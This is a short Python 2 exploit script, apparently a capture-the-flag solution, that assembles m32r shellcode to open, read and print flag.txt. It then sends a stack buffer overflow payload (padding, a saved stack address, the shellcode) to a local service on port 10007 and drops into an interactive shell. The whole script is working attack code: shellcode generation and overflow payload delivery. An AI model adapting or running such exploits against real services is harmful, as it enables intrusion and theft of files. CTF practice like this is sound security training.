asm = '''.section .text
.global _start

.ascii "%s"
_start:
  bl get_addr
ret:
  push lr
  pop r8
open:
  push r8
  pop r1
  xor r5, r5
  push r5
  pop r2
  push r5
  pop r3
  ldi r0, #2
  trap #0
read:
  push r0
  pop r1
  push r8
  pop r2
  ldi r3, #0x7f
  ldi r0, #4
  trap #0
write:
  ldi r3, #0x7f
  push r8
  pop r2
  ldi r1, #1
  ldi r0, #5
  trap #0
get_addr:
  bl ret
.ascii "%s"
  '''
import os
from lib.mylib import *


ARCH = 'm32r'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10007
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x1b0c
shellcode = 'AAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
